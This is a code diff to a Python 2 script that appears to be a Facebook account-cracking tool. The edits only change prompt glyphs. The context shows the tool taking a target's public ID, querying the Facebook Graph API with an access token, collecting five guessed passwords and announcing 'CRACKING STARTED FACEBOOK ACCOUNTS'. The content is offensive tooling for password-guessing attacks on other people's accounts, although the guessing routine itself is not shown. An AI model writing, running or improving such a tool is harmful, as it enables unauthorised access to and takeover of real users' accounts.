@@ -282,13 +282,13 @@ def pilih_passxd():
         os.system('clear')
         print logo
         print 71 * '-'
-        idt = raw_input('\x1b[1;93m\n[+]✓ID Public : ')
+        idt = raw_input('\x1b[1;93m\n[+]>ID Public : ')
         try:
             pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
             sp = json.loads(pok.text)
-            print '\x1b[1;92m\n[+]✓Name : ' + sp['name']
+            print '\x1b[1;92m\n[+]>Name : ' + sp['name']
         except KeyError:
-            print '\x1b[1;91m\n[!] ID Public There Is No !'
+            print '\x1b[1;91m\n[!]>ID Public There Is No !'
             raw_input('\n  [Back]')
             menu()
         except requests.exceptions.ConnectionError:
@@ -308,11 +308,11 @@ def pilih_passxd():
     else:
         print '\x1b[1;96m\n[!] Fill in the correct'
         passchoice()
-    pass1 = raw_input('\n\x1b[1;92m[?]✓Password 1   : ')
-    pass2 = raw_input('\x1b[1;92m[?]✓Password 2   : ')
-    pass3 = raw_input('\x1b[1;92m[?]✓Password 3   : ')
-    pass4 = raw_input('\x1b[1;92m[?]✓Password 4   : ')
-    pass5 = raw_input('\x1b[1;92m[?]✓Password 5   : ')
+    pass1 = raw_input('\n\x1b[1;92m[?]>Password 1   : ')
+    pass2 = raw_input('\x1b[1;92m[?]>Password 2   : ')
+    pass3 = raw_input('\x1b[1;92m[?]>Password 3   : ')
+    pass4 = raw_input('\x1b[1;92m[?]>Password 4   : ')
+    pass5 = raw_input('\x1b[1;92m[?]>Password 5   : ')
     print 71 * '-'
     print '\x1b[1;97m\x1b[41m               \x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] CRACKING STARTED FACEBOOK ACCOUNTS \x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m]              \x1b[00m'
     print 71 * '-'
